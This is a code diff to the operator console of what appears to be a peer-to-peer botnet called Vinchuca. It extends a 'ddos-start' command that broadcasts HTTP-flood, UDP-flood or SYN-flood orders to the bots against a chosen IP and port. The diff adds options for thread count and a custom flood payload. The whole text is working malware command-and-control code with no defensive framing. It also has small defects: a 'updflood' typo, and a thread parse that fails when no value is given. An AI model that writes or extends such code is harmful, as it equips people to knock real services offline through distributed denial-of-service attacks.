@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Net;
+using System.Text;
 using Mono.Options;
 using Vinchuca;
 using Vinchuca.Network.Protocol.Messages.Command;
@@ -15,6 +16,8 @@ namespace REPL.Commands
         public bool ShowHelp { get; set; }
         public string Target { get; set; }
         public string Type { get; set; }
+        public string Threads { get; set; }
+        public string Buffer { get; set; }
 
         public DDoSStartCommand(Agent agent, CommandLineReader repl)
             : base("ddos-start", "Perform DDOS attack against specified target.")
@@ -25,9 +28,11 @@ namespace REPL.Commands
                 "usage: ddos-start --type:attack-type --target:ipaddress:port",
                 "",
                 "Performs a DDoS attack against the specified target ip:port endpoint.",
-                "eg: ddos --type:httpflood --target:212.54.13.87:80",
-                { "type=",   "{type} of attack [httpflood | udpflood | tcpsynflood].", x => Type = x },
+                "eg: ddos --type:httpflood --target:212.54.13.87:80 --threads:3",
+                { "type=",   "{type} of attack [httpflood | udpflood | synflood].", x => Type = x },
                 { "target=", "{target} to attack (ipaddress:port endpoint)", x => Target = x },
+                { "threads=", "number of {threads} used in the attack (default: 4)", x => Threads = x },
+                { "data=", "{data} to send in httpflood or updflood", x=> Buffer = x },
                 { "help|h|?","Show this message and exit.", v => ShowHelp = v != null },
             };
             _repl.AddAutocompletionWords("ddos-start", "--type", "--target", "synflood", "udpflood", "httpflood");
@@ -81,9 +86,9 @@ namespace REPL.Commands
                 {
                     AttackId = session,
                     Type = type,
-                    Threads = 4,
+                    Threads = short.Parse(Threads),
                     Target = new IPEndPoint(IPAddress.Parse(ip), port),
-                    Buffer = new byte[0]
+                    Buffer = Encoding.ASCII.GetBytes(Buffer)
                 };
                 _agent.MessagesManager.Broadcast(ddosMessage, 6);
                 Console.WriteLine($"Attack sessionID {session}");
